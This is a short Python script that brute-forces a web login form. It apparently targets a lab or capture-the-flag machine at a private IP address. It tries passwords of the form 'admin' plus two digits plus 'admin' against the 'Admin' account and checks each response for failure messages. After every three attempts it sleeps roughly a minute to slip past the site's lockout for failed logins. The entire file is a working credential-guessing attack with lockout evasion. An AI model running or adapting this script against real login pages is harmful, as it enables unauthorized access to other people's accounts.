#!/usr/bin/python3

import requests
import time
import re

tries = 0

for x in range(10):
	for y in range(10):
		trypass = "admin"+str(x)+str(y)+"admin"		
		data = {"username":'Admin',"password":trypass,"submit":'Submit'}
		response = requests.post('http://10.10.81.111/index.php', data=data)
		valid = re.findall('Please enter valid login details', response.text)
		notvalid = re.findall('To many failed', response.text)
		print(trypass + ":", end="" )
		if valid != [] or notvalid != []:
			print("no")
		else:
			print("done.")
			quit();
		tries = tries+1
		if tries > 2:
			print("wait...")
			time.sleep(57)
			print("starting...")
			tries = 0
			time.sleep(3)